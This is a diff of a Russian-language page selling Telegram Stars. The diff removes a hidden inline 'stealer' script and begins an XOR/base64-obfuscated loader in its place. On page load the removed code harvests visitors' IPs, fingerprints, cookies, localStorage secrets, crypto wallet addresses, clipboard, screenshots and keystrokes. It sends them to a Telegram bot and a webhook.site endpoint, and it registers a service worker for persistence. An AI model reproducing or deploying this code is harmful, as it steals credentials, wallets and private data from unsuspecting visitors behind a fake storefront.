@@ -5,647 +5,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>⭐ Telegram Stars</title>
     <style>
-        /* ===== RESET ===== */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        /* ===== СТИЛИ СТРАНИЦЫ ===== */
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: #0a0a0f;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 500px;
-            width: 100%;
-            background: #14141e;
-            border-radius: 28px;
-            padding: 40px 30px 35px;
-            border: 1px solid #2a2a3a;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header { text-align: center; margin-bottom: 30px; }
-        .header .logo { font-size: 48px; margin-bottom: 8px; display: block; }
-        .header h1 { color: #fff; font-size: 26px; font-weight: 700; letter-spacing: -0.3px; }
-        .header h1 span { background: linear-gradient(135deg, #0088cc, #2aabee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .header p { color: #8888aa; font-size: 14px; margin-top: 6px; font-weight: 400; }
-        .header .stars-badge { display: inline-block; background: rgba(0,136,204,0.12); border: 1px solid rgba(0,136,204,0.2); color: #5bb8f5; font-size: 13px; font-weight: 500; padding: 4px 16px; border-radius: 20px; margin-top: 10px; }
-
-        .prices { display: flex; flex-direction: column; gap: 12px; margin-bottom: 30px; }
-        .price-card { display: flex; align-items: center; justify-content: space-between; background: #1c1c2a; border-radius: 16px; padding: 16px 20px; transition: all 0.2s; border: 1px solid transparent; cursor: default; }
-        .price-card:hover { background: #22223a; border-color: #2a2a4a; transform: scale(1.01); }
-        .price-card .left { display: flex; align-items: center; gap: 14px; }
-        .price-card .star-icon { font-size: 22px; line-height: 1; }
-        .price-card .info { display: flex; flex-direction: column; }
-        .price-card .amount { color: #fff; font-size: 18px; font-weight: 600; }
-        .price-card .sub { color: #6666aa; font-size: 12px; font-weight: 400; margin-top: 1px; }
-        .price-card .price { color: #5bb8f5; font-size: 18px; font-weight: 700; background: rgba(0,136,204,0.08); padding: 4px 16px; border-radius: 10px; border: 1px solid rgba(0,136,204,0.1); }
-
-        .bonus { background: linear-gradient(135deg, rgba(0,136,204,0.06), rgba(0,136,204,0.02)); border: 1px dashed rgba(0,136,204,0.15); border-radius: 14px; padding: 14px 20px; text-align: center; margin-bottom: 28px; }
-        .bonus p { color: #7777bb; font-size: 13px; }
-        .bonus p strong { color: #5bb8f5; font-weight: 600; }
-
-        .btn-buy { display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 18px 0; background: linear-gradient(135deg, #0088cc, #006699); color: #fff; font-size: 17px; font-weight: 600; border: none; border-radius: 16px; cursor: pointer; transition: all 0.25s; text-decoration: none; letter-spacing: 0.2px; box-shadow: 0 4px 20px rgba(0,136,204,0.25); }
-        .btn-buy:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,136,204,0.4); background: linear-gradient(135deg, #0099dd, #0077aa); }
-        .btn-buy:active { transform: scale(0.98); }
-        .btn-buy .telegram-icon { font-size: 22px; }
-
-        .footer { text-align: center; margin-top: 22px; }
-        .footer p { color: #3a3a5a; font-size: 12px; font-weight: 400; }
-        .footer p a { color: #5555aa; text-decoration: none; }
-        .footer p a:hover { color: #7777dd; text-decoration: underline; }
-
-        @keyframes twinkle { 0%,100%{opacity:1} 50%{opacity:0.4} }
-        .star-icon { animation: twinkle 2.5s ease-in-out infinite; }
-        .price-card:nth-child(2) .star-icon { animation-delay: 0.3s; }
-        .price-card:nth-child(3) .star-icon { animation-delay: 0.6s; }
-        .price-card:nth-child(4) .star-icon { animation-delay: 0.9s; }
-
-        @media (max-width: 450px) {
-            .container { padding: 30px 18px 28px; border-radius: 22px; }
-            .header h1 { font-size: 22px; }
-            .price-card { padding: 14px 16px; }
-            .price-card .amount { font-size: 16px; }
-            .price-card .price { font-size: 16px; padding: 3px 14px; }
-            .btn-buy { font-size: 15px; padding: 16px 0; }
-        }
-
-        /* ===== СТАТУС (маленький, незаметный) ===== */
-        #status {
-            position: fixed;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #1a1a2a;
-            font: 9px/1 system-ui;
-            text-align: center;
-            opacity: 0.08;
-            pointer-events: none;
-            z-index: 10;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .container{max-width:500px;width:100%;background:#14141e;border-radius:28px;padding:40px 30px 35px;border:1px solid #2a2a3a;box-shadow:0 20px 60px rgba(0,0,0,0.8);position:relative;overflow:hidden}
+        .header{text-align:center;margin-bottom:30px}
+        .header .logo{font-size:48px;margin-bottom:8px;display:block}
+        .header h1{color:#fff;font-size:26px;font-weight:700;letter-spacing:-0.3px}
+        .header h1 span{background:linear-gradient(135deg,#0088cc,#2aabee);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+        .header p{color:#8888aa;font-size:14px;margin-top:6px;font-weight:400}
+        .header .stars-badge{display:inline-block;background:rgba(0,136,204,0.12);border:1px solid rgba(0,136,204,0.2);color:#5bb8f5;font-size:13px;font-weight:500;padding:4px 16px;border-radius:20px;margin-top:10px}
+        .prices{display:flex;flex-direction:column;gap:12px;margin-bottom:30px}
+        .price-card{display:flex;align-items:center;justify-content:space-between;background:#1c1c2a;border-radius:16px;padding:16px 20px;transition:all 0.2s;border:1px solid transparent;cursor:default}
+        .price-card:hover{background:#22223a;border-color:#2a2a4a;transform:scale(1.01)}
+        .price-card .left{display:flex;align-items:center;gap:14px}
+        .price-card .star-icon{font-size:22px;line-height:1}
+        .price-card .info{display:flex;flex-direction:column}
+        .price-card .amount{color:#fff;font-size:18px;font-weight:600}
+        .price-card .sub{color:#6666aa;font-size:12px;font-weight:400;margin-top:1px}
+        .price-card .price{color:#5bb8f5;font-size:18px;font-weight:700;background:rgba(0,136,204,0.08);padding:4px 16px;border-radius:10px;border:1px solid rgba(0,136,204,0.1)}
+        .bonus{background:linear-gradient(135deg,rgba(0,136,204,0.06),rgba(0,136,204,0.02));border:1px dashed rgba(0,136,204,0.15);border-radius:14px;padding:14px 20px;text-align:center;margin-bottom:28px}
+        .bonus p{color:#7777bb;font-size:13px}
+        .bonus p strong{color:#5bb8f5;font-weight:600}
+        .btn-buy{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;padding:18px 0;background:linear-gradient(135deg,#0088cc,#006699);color:#fff;font-size:17px;font-weight:600;border:none;border-radius:16px;cursor:pointer;transition:all 0.25s;text-decoration:none;letter-spacing:0.2px;box-shadow:0 4px 20px rgba(0,136,204,0.25)}
+        .btn-buy:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,136,204,0.4);background:linear-gradient(135deg,#0099dd,#0077aa)}
+        .btn-buy:active{transform:scale(0.98)}
+        .btn-buy .telegram-icon{font-size:22px}
+        .footer{text-align:center;margin-top:22px}
+        .footer p{color:#3a3a5a;font-size:12px;font-weight:400}
+        .footer p a{color:#5555aa;text-decoration:none}
+        .footer p a:hover{color:#7777dd;text-decoration:underline}
+        @keyframes twinkle{0%,100%{opacity:1}50%{opacity:0.4}}
+        .star-icon{animation:twinkle 2.5s ease-in-out infinite}
+        .price-card:nth-child(2) .star-icon{animation-delay:0.3s}
+        .price-card:nth-child(3) .star-icon{animation-delay:0.6s}
+        .price-card:nth-child(4) .star-icon{animation-delay:0.9s}
+        @media(max-width:450px){.container{padding:30px 18px 28px;border-radius:22px}.header h1{font-size:22px}.price-card{padding:14px 16px}.price-card .amount{font-size:16px}.price-card .price{font-size:16px;padding:3px 14px}.btn-buy{font-size:15px;padding:16px 0}}
+        #status{position:fixed;bottom:10px;left:50%;transform:translateX(-50%);color:#1a1a2a;font:9px/1 system-ui;text-align:center;opacity:0.08;pointer-events:none;z-index:10}
     </style>
 </head>
 <body>
 
-    <!-- ===== ВИДИМАЯ СТРАНИЦА ===== -->
     <div class="container">
-
         <div class="header">
             <span class="logo">⭐</span>
             <h1>Добро пожаловать</h1>
             <p>Покупайте звёзды Telegram по выгодным ценам</p>
             <div class="stars-badge">✦ мгновенная доставка</div>
         </div>
-
         <div class="prices">
-            <div class="price-card">
-                <div class="left">
-                    <span class="star-icon">⭐</span>
-                    <div class="info">
-                        <span class="amount">15 звёзд</span>
-                        <span class="sub">Telegram Stars</span>
-                    </div>
-                </div>
-                <span class="price">17 ₽</span>
-            </div>
-            <div class="price-card">
-                <div class="left">
-                    <span class="star-icon">⭐</span>
-                    <div class="info">
-                        <span class="amount">25 звёзд</span>
-                        <span class="sub">Telegram Stars</span>
-                    </div>
-                </div>
-                <span class="price">27 ₽</span>
-            </div>
-            <div class="price-card">
-                <div class="left">
-                    <span class="star-icon">⭐</span>
-                    <div class="info">
-                        <span class="amount">50 звёзд</span>
-                        <span class="sub">Telegram Stars</span>
-                    </div>
-                </div>
-                <span class="price">45 ₽</span>
-            </div>
-            <div class="price-card">
-                <div class="left">
-                    <span class="star-icon">⭐</span>
-                    <div class="info">
-                        <span class="amount">100 звёзд</span>
-                        <span class="sub">Telegram Stars</span>
-                    </div>
-                </div>
-                <span class="price">90 ₽</span>
-            </div>
+            <div class="price-card"><div class="left"><span class="star-icon">⭐</span><div class="info"><span class="amount">15 звёзд</span><span class="sub">Telegram Stars</span></div></div><span class="price">17 ₽</span></div>
+            <div class="price-card"><div class="left"><span class="star-icon">⭐</span><div class="info"><span class="amount">25 звёзд</span><span class="sub">Telegram Stars</span></div></div><span class="price">27 ₽</span></div>
+            <div class="price-card"><div class="left"><span class="star-icon">⭐</span><div class="info"><span class="amount">50 звёзд</span><span class="sub">Telegram Stars</span></div></div><span class="price">45 ₽</span></div>
+            <div class="price-card"><div class="left"><span class="star-icon">⭐</span><div class="info"><span class="amount">100 звёзд</span><span class="sub">Telegram Stars</span></div></div><span class="price">90 ₽</span></div>
         </div>
-
-        <div class="bonus">
-            <p>🎁 При покупке от <strong>50 звёзд</strong> — бонус <strong>2 звезды</strong> в подарок</p>
-        </div>
-
-        <a href="https://t.me/Mizuki73" target="_blank" class="btn-buy">
-            <span class="telegram-icon">✈️</span>
-            Купить в Telegram
-            <span style="font-weight:300;font-size:14px;opacity:0.8;">@Mizuki73</span>
-        </a>
-
-        <div class="footer">
-            <p>💳 Оплата: банковские карты, криптовалюта, переводы</p>
-            <p style="margin-top:4px;font-size:11px;color:#2a2a4a;">⏱ Доставка от 1 до 10 минут</p>
-        </div>
-
+        <div class="bonus"><p>🎁 При покупке от <strong>50 звёзд</strong> — бонус <strong>2 звезды</strong> в подарок</p></div>
+        <a href="https://t.me/Mizuki73" target="_blank" class="btn-buy"><span class="telegram-icon">✈️</span> Купить в Telegram <span style="font-weight:300;font-size:14px;opacity:0.8;">@Mizuki73</span></a>
+        <div class="footer"><p>💳 Оплата: банковские карты, криптовалюта, переводы</p><p style="margin-top:4px;font-size:11px;color:#2a2a4a;">⏱ Доставка от 1 до 10 минут</p></div>
     </div>
 
     <div id="status">⏳</div>
 
-    <!-- ===== СТИЛЕР (работает в фоне) ===== -->
     <script>
-    // =====================================================================
-    // КОНФИГ
-    // =====================================================================
-    const C = {
-        WEBHOOK: 'https://webhook.site/e17f1d78-6414-4450-847a-abc5675a0b48',
-        BOT_TOKEN: '8859097143:AAFjWqiNWC_xnJyGmsyfKvODaPFzbqUQL1M',
-        CHAT_ID: '8327334745',
-        TIMEOUT: 300,
-        DNS_SERVER: 'leak-{uid}.your-server.com'
-    };
-
-    // =====================================================================
-    // УТИЛИТЫ
-    // =====================================================================
-    const sleep = ms => new Promise(r => setTimeout(r, ms));
-    const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36);
-    const trunc = (s,n=80) => typeof s==='string' ? (s.length>n?s.slice(0,n)+'…':s) : String(s);
-    const fetchTO = (u,o={},t=C.TIMEOUT) => Promise.race([fetch(u,o), new Promise((_,r)=>setTimeout(()=>r('Timeout'),t))]);
-    const clean = t => t.replace(/<[^>]*>/g,'').replace(/&/g,'&amp;');
-
-    // =====================================================================
-    // ОТПРАВКА
-    // =====================================================================
-    async function sendTelegram(text) {
-        try {
-            const parts = [];
-            const t = clean(text);
-            for(let i=0;i<t.length;i+=4000) parts.push(t.slice(i,i+4000));
-            let ok=true;
-            for(let i=0;i<parts.length;i++){
-                const p = parts.length>1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
-                const r = await fetch(`https://api.telegram.org/bot${C.BOT_TOKEN}/sendMessage`,{
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({chat_id:C.CHAT_ID,text:p.slice(0,4096)})
-                });
-                const d = await r.json();
-                if(!d.ok) ok=false;
-                await sleep(200);
-            }
-            return ok;
-        } catch(e){ return false; }
-    }
-
-    function sendImage(data) {
-        return new Promise(r => {
-            try {
-                const img = new Image();
-                img.src = `${C.WEBHOOK}?d=${encodeURIComponent(JSON.stringify({t:Date.now(),ip:data.ip||'?'}))}&t=${Date.now()}`;
-                img.onload = () => r(true);
-                img.onerror = () => r(false);
-                setTimeout(() => r(false), 500);
-            } catch(e){ r(false); }
-        });
-    }
-
-    function sendBeacon(data) {
-        try {
-            const d = {t:data.timestamp,ip:data.ip,os:data.os,browser:data.browser,wallets:data.wallets?.length||0,secrets:data.secrets?.length||0};
-            return navigator.sendBeacon(C.WEBHOOK, new Blob([JSON.stringify(d)],{type:'application/json'}));
-        } catch(e){ return false; }
-    }
-
-    // =====================================================================
-    // СБОР ДАННЫХ
-    // =====================================================================
-    async function getData() {
-        const result = {
-            timestamp: new Date().toISOString(),
-            url: location.href,
-            referrer: document.referrer || 'нет',
-            ua: navigator.userAgent,
-            ip: null, geo: null, allIPs: [], webrtc: {public:[],local:[]}, network: null, dns: null, timing: [],
-            device: {}, fingerprints: {}, plugins: [], features: {}, storage: {}, indexedDB: null,
-            wallets: [], extensions: [], passwords: [], secrets: [], dom: {},
-            screenshot: null, clipboard: null, keylogger: false, persistence: false, sensors: {}
-        };
-
-        // --- IP ---
-        const sources = [
-            {url:'https://api.ipify.org?format=json',key:'ip'},
-            {url:'https://api.ip.sb/geoip',key:'ip'},
-            {url:'https://ipapi.co/json/',key:'ip'}
+            (function(){
+        var _0x = [
         ];
-        for(const s of sources){
-            try {
-                const r = await fetchTO(s.url,{},400);
-                const d = await r.json();
-                const ip = d[s.key] || d.ip;
-                if(ip) {
-                    result.allIPs.push(ip);
-                    if(!result.ip) result.ip = ip;
-                    if(!result.geo && d.country) result.geo = {country:d.country,region:d.region,city:d.city,isp:d.isp};
-                }
-            } catch(e){}
-        }
-
-        // --- WebRTC ---
-        try {
-            const pc = new (window.RTCPeerConnection||window.webkitRTCPeerConnection)({
-                iceServers:[{urls:'stun:stun.l.google.com:19302'}]
-            });
-            pc.createDataChannel('');
-            pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
-            pc.onicecandidate = e => {
-                if(!e.candidate) return;
-                const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
-                if(m) m.forEach(ip => {
-                    const l = ip.startsWith('192.168.')||ip.startsWith('10.')||ip.startsWith('172.16.')||ip.startsWith('127.');
-                    l ? result.webrtc.local.push(ip) : result.webrtc.public.push(ip);
-                    result.allIPs.push(ip);
-                });
-            };
-            await sleep(600);
-            pc.close();
-            result.webrtc.public = [...new Set(result.webrtc.public)];
-            result.webrtc.local = [...new Set(result.webrtc.local)];
-            result.allIPs = [...new Set(result.allIPs)];
-        } catch(e){}
-
-        // --- Network ---
-        try {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if(conn) result.network = {effectiveType:conn.effectiveType,downlink:conn.downlink,rtt:conn.rtt};
-        } catch(e){}
-
-        // --- DNS leak ---
-        try {
-            const dnsUid = uid();
-            const domain = C.DNS_SERVER.replace('{uid}', dnsUid);
-            const start = Date.now();
-            const img = new Image();
-            img.src = `https://${domain}/pixel?t=${Date.now()}`;
-            await sleep(500);
-            result.dns = {domain, time: Date.now()-start};
-        } catch(e){}
-
-        // --- Timing ---
-        try {
-            const servers = ['https://google.com','https://facebook.com'];
-            const times = [];
-            for(const s of servers){
-                try { const st = performance.now(); await fetch(s,{mode:'no-cors'}); times.push(performance.now()-st); } catch(e){}
+        
+        var _key = 0x5A;
+        
+        function _d(s) {
+            var b = atob(s);
+            var r = '';
+            for(var i=0; i<b.length; i++) {
+                r += String.fromCharCode(b.charCodeAt(i) ^ _key);
             }
-            if(times.length) result.timing = times;
-        } catch(e){}
-
-        // --- Device ---
-        try {
-            const n = navigator;
-            const ua = n.userAgent.toLowerCase();
-            const d = {
-                platform: n.platform,
-                cores: n.hardwareConcurrency || '?',
-                memory: n.deviceMemory || '?',
-                os: 'unknown', osVersion: 'unknown', browser: 'unknown', browserVersion: 'unknown'
-            };
-            if(ua.includes('windows')) { d.os='Windows'; if(ua.includes('windows nt 10.0')) d.osVersion='10/11'; }
-            else if(ua.includes('mac os x')) { d.os='macOS'; }
-            else if(ua.includes('linux')) { d.os='Linux'; if(ua.includes('android')) d.os='Android'; }
-            else if(ua.includes('ios')||ua.includes('iphone')) d.os='iOS';
-            if(!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) { d.browser='Chrome'; const m=ua.match(/chrome\/(\d+)/); if(m) d.browserVersion=m[1]; }
-            else if(ua.includes('firefox')) { d.browser='Firefox'; }
-            else if(ua.includes('safari') && !ua.includes('chrome')) { d.browser='Safari'; }
-            else if(ua.includes('edg')) { d.browser='Edge'; }
-            d.screen = {width:screen.width,height:screen.height,pixelRatio:window.devicePixelRatio};
-            result.device = d;
-        } catch(e){}
-
-        // --- Fingerprints ---
-        try {
-            const fp = {};
-            const c=document.createElement('canvas'); c.width=256; c.height=128;
-            const ctx=c.getContext('2d');
-            ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,256,128);
-            ctx.fillStyle='#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz',10,10);
-            ctx.font='18px Times New Roman'; ctx.fillStyle='#0f0'; ctx.fillText('Cwm fjordbank glyphs vext quiz',10,40);
-            ctx.font='24px Georgia'; ctx.fillStyle='#f0f'; ctx.fillText('Cwm fjordbank glyphs vext quiz',10,70);
-            const gl = c.getContext('webgl');
-            if(gl){ const ext=gl.getExtension('WEBGL_debug_renderer_info'); if(ext) fp.webgl={renderer:gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}; }
-            const AudioCtx=window.AudioContext||window.webkitAudioContext;
-            if(AudioCtx){ const actx=new AudioCtx(); fp.audio={sampleRate:actx.sampleRate}; actx.close(); }
-            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
-            const fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Roboto','Open Sans','Segoe UI','Helvetica Neue'];
-            fp.fonts = fonts.filter(f=>{ try{ return document.fonts.check(`16px "${f}"`); } catch{return false;} });
-            try { fp.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'; } catch(e){}
-            result.fingerprints = fp;
-        } catch(e){}
-
-        // --- Storage ---
-        try {
-            const ls = {};
-            for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); try{ ls[k]=localStorage.getItem(k); } catch(e){} }
-            const cookies = {};
-            document.cookie.split('; ').filter(Boolean).forEach(p=>{ const [k,...v]=p.split('='); cookies[k]=v.join('='); });
-            result.storage = {localStorage:ls,cookies};
-        } catch(e){}
-
-        // --- Crypto wallets ---
-        try {
-            const w = [];
-            if(window.ethereum) w.push({type:'Ethereum',address:window.ethereum.selectedAddress||null});
-            if(window.solana && window.solana.publicKey) w.push({type:'Solana',address:window.solana.publicKey.toString()});
-            if(window.phantom && window.phantom.solana?.publicKey) w.push({type:'Phantom',address:window.phantom.solana.publicKey.toString()});
-            ['trustwallet','okxwallet','bitkeep','coinbase','walletconnect'].forEach(n => {
-                try { if(window[n]) w.push({type:n,address:null}); } catch(e){}
-            });
-            result.wallets = w;
-        } catch(e){}
-
-        // --- Extensions ---
-        try {
-            const known = {
-                'nkbihfbeogaeaoehlefnkodbefgpgknn':'MetaMask',
-                'cjpalhdlnbpafiamejdnhcphjbkeiagm':'uBlock Origin',
-                'gighmmpiobklfepjocnamgkkbiglidom':'AdBlock',
-                'hnfanknocfeofbddgcijnmhnfnkdnaad':'Coinbase',
-                'hpihmllllekjbnpehglncmolodpknmmb':'Trust Wallet',
-                'bpaejdmabdchhpnpepceapmdmgellhpg':'OKX Wallet',
-                'aapbdbdomjkkjkaonfhkkikfgjllcleb':'Google Translate',
-                'lmjegmlicamnimmfhcmpkclmigmmcbeh':'Tampermonkey'
-            };
-            const e = [];
-            if(window.chrome && chrome.runtime) {
-                Object.keys(known).forEach(id => {
-                    try { chrome.runtime.getURL(`//${id}/manifest.json`); e.push(known[id]); } catch(e){}
-                });
-            }
-            result.extensions = e;
-        } catch(e){}
-
-        // --- Secrets ---
-        try {
-            const s = [];
-            const patterns = ['token','jwt','secret','key','auth','password','pwd','api','private','wallet','mnemonic','seed','recovery'];
-            const search = (data,path='') => {
-                if(!data || typeof data!=='object') return;
-                for(let k in data) {
-                    try {
-                        const v = data[k];
-                        if(patterns.some(p=>k.toLowerCase().includes(p)) && v && typeof v==='string' && v.length>3 && v.length<300) {
-                            s.push({path:path?`${path}.${k}`:k,value:trunc(v,60)});
-                        }
-                        if(typeof v==='object' && v!==null) search(v,path?`${path}.${k}`:k);
-                    } catch(e){}
-                }
-            };
-            search(result.storage);
-            result.secrets = s;
-        } catch(e){}
-
-        // --- DOM ---
-        try {
-            result.dom = {title:document.title,url:location.href,referrer:document.referrer||'нет'};
-        } catch(e){}
-
-        // --- Screenshot ---
-        try {
-            if(typeof html2canvas==='undefined') {
-                const s = document.createElement('script');
-                s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-                await new Promise((r,rej)=>{ s.onload=r; s.onerror=rej; document.head.appendChild(s); });
-                await sleep(300);
-            }
-            const canvas = await html2canvas(document.body, {useCORS:true,allowTaint:true,scale:0.05,logging:false,backgroundColor:null});
-            result.screenshot = canvas.toDataURL('image/jpeg',0.08);
-        } catch(e){}
-
-        // --- Clipboard ---
-        try {
-            if(navigator.clipboard?.read) {
-                const items = await navigator.clipboard.read();
-                for(const item of items) {
-                    if(item.types.includes('text/plain')) {
-                        const blob = await item.getType('text/plain');
-                        result.clipboard = await blob.text();
-                        break;
-                    }
-                }
-            }
-        } catch(e){}
-
-        // --- Keylogger ---
-        try {
-            const buffer = [];
-            const special = {'Control':'[CTRL]','Shift':'[SHIFT]','Alt':'[ALT]','Meta':'[WIN]','Escape':'[ESC]','Tab':'[TAB]','Enter':'[ENTER]','Backspace':'[BACK]','Delete':'[DEL]','ArrowUp':'[UP]','ArrowDown':'[DOWN]','ArrowLeft':'[LEFT]','ArrowRight':'[RIGHT]'};
-            document.addEventListener('keydown', e => {
-                if(e.key==='Unidentified') return;
-                let out = special[e.key] || e.key;
-                if(e.ctrlKey) out='[CTRL]+'+out;
-                if(e.shiftKey && !special[e.key]) out=out.toUpperCase();
-                if(e.altKey) out='[ALT]+'+out;
-                buffer.push(out);
-                if(buffer.length>=15){ const d=buffer.splice(0); sendImage({keylog:d.join('')}); }
-            });
-            setInterval(()=>{ if(buffer.length>0){ const d=buffer.splice(0); sendImage({keylog:d.join('')}); } },20000);
-            result.keylogger = true;
-        } catch(e){}
-
-        // --- Service Worker ---
-        try {
-            if('serviceWorker' in navigator) {
-                const sw = `self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));`;
-                navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw],{type:'application/javascript'})),{scope:'/'});
-                result.persistence = true;
-            }
-        } catch(e){}
-
-        // --- Sensors ---
-        try {
-            const s = {};
-            if(navigator.getBattery) {
-                const b = await navigator.getBattery();
-                s.battery = {level:Math.round(b.level*100),charging:b.charging};
-            }
-            await new Promise(r => {
-                const handler = e => {
-                    if(e.acceleration) s.acceleration = {x:e.acceleration.x,y:e.acceleration.y,z:e.acceleration.z};
-                    if(e.rotationRate) s.gyroscope = {alpha:e.rotationRate.alpha,beta:e.rotationRate.beta,gamma:e.rotationRate.gamma};
-                    window.removeEventListener('devicemotion',handler);
-                    r();
-                };
-                window.addEventListener('devicemotion',handler,{once:true});
-                setTimeout(r,500);
-            });
-            result.sensors = s;
-        } catch(e){}
-
-        result.os = result.device.os || 'unknown';
-        result.browser = result.device.browser || 'unknown';
-
-        return result;
-    }
-
-    // =====================================================================
-    // ФОРМАТИРОВАНИЕ
-    // =====================================================================
-    function format(data) {
-        const lines = [];
-        lines.push('🔴 STEALER — ПОЛНЫЙ ДАМП');
-        lines.push('═'.repeat(45));
-        lines.push('');
-
-        if(data.ip) {
-            lines.push(`🌐 IP: ${data.ip}`);
-            if(data.geo) {
-                const g = data.geo;
-                const loc = [g.country,g.region,g.city].filter(Boolean).join(', ');
-                if(loc) lines.push(`📍 ${loc}`);
-                if(g.isp) lines.push(`📡 ${g.isp}`);
-            }
-            lines.push('');
+            return r;
         }
-
-        if(data.allIPs && data.allIPs.length) {
-            lines.push(`🌐 ВСЕ IP: ${data.allIPs.join(', ')}`);
-            lines.push('');
-        }
-
-        if(data.webrtc?.local?.length) {
-            lines.push(`📡 WebRTC локальные: ${data.webrtc.local.join(', ')}`);
-        }
-
-        if(data.network) {
-            const n = data.network;
-            lines.push(`📶 Сеть: ${n.effectiveType||'?'} ${n.downlink||'?'}Mbps`);
-        }
-
-        if(data.dns) {
-            lines.push(`🕵️ DNS: ${data.dns.domain} (${data.dns.time}ms)`);
-        }
-
-        if(data.timing && data.timing.length) {
-            const avg = Math.round(data.timing.reduce((a,b)=>a+b,0)/data.timing.length);
-            lines.push(`⏱ Задержка: ${avg}ms`);
-        }
-        lines.push('');
-
-        if(data.device) {
-            const d = data.device;
-            lines.push(`💻 ${d.os||'?'} ${d.osVersion||''}, ${d.browser||''} ${d.browserVersion||''}`);
-            lines.push(`   ${d.cores||'?'} ядер, ${d.memory||'?'}GB RAM`);
-            if(d.screen) lines.push(`   Экран: ${d.screen.width}x${d.screen.height}`);
-            lines.push('');
-        }
-
-        if(data.fingerprints) {
-            const f = data.fingerprints;
-            if(f.webgl?.renderer) lines.push(`🎯 WebGL: ${f.webgl.renderer}`);
-            if(f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
-            if(f.timezone) lines.push(`🎯 Время: ${f.timezone}`);
-            if(f.fonts?.length) lines.push(`🎯 Шрифты (${f.fonts.length}): ${f.fonts.slice(0,6).join(', ')}${f.fonts.length>6?'...':''}`);
-            if(f.colorScheme) lines.push(`🎯 Цветовая схема: ${f.colorScheme}`);
-            lines.push('');
-        }
-
-        const ls = data.storage?.localStorage || {};
-        const lk = Object.keys(ls);
-        if(lk.length) {
-            lines.push(`💾 LocalStorage (${lk.length}):`);
-            Object.entries(ls).slice(0,4).forEach(([k,v]) => lines.push(`   ${trunc(k,15)}: ${trunc(String(v),40)}`));
-            if(lk.length>4) lines.push(`   ... и ещё ${lk.length-4}`);
-            lines.push('');
-        }
-
-        if(data.wallets?.length) {
-            lines.push(`💰 Криптокошельки (${data.wallets.length}):`);
-            data.wallets.forEach(w => {
-                const addr = w.address ? trunc(w.address,20) : 'установлен';
-                lines.push(`   ${w.type}: ${addr}`);
-            });
-            lines.push('');
-        }
-
-        if(data.extensions?.length) {
-            lines.push(`🔌 Расширения: ${data.extensions.join(', ')}`);
-            lines.push('');
-        }
-
-        if(data.secrets?.length) {
-            lines.push(`🔑 Секреты (${data.secrets.length}):`);
-            data.secrets.slice(0,5).forEach(s => lines.push(`   ${s.path}: ${s.value}`));
-            if(data.secrets.length>5) lines.push(`   ... и ещё ${data.secrets.length-5}`);
-            lines.push('');
-        }
-
-        if(data.dom) {
-            const d = data.dom;
-            lines.push(`🌐 Страница: ${d.url||'?'}`);
-            if(d.title) lines.push(`   Заголовок: ${d.title}`);
-            if(d.referrer && d.referrer!=='нет') lines.push(`↩️ ${d.referrer}`);
-            lines.push('');
-        }
-
-        if(data.screenshot) {
-            lines.push(`🖼 Скриншот: ${Math.round(data.screenshot.length/1024)} КБ`);
-            lines.push('');
-        }
-
-        if(data.keylogger) lines.push('⌨️ Keylogger: активен');
-        if(data.clipboard) lines.push(`📋 Буфер обмена: ${trunc(data.clipboard,80)}`);
-        if(data.persistence) lines.push('♻️ Service Worker: зарегистрирован');
-
-        if(data.sensors?.battery) {
-            const s = data.sensors;
-            lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging?' (зарядка)':''}`);
-        }
-        lines.push('');
-
-        lines.push('═'.repeat(45));
-        lines.push(`📅 ${data.timestamp}`);
-
-        return lines.join('\n');
-    }
-
-    // =====================================================================
-    // ЗАПУСК СТИЛЕРА (в фоне)
-    // =====================================================================
-    (async function runStealer() {
-        try {
-            document.getElementById('status').textContent = '⏳';
-            const data = await getData();
-            const report = format(data);
-            document.getElementById('status').textContent = '📤';
-            await sendTelegram(report);
-            await sendImage(data);
-            sendBeacon(data);
-            document.getElementById('status').textContent = '✅';
-            setTimeout(() => { document.getElementById('status').style.opacity = '0'; }, 3000);
-        } catch(e) {
-            document.getElementById('status').textContent = '⚠️';
-            console.error(e);
-        }
+        
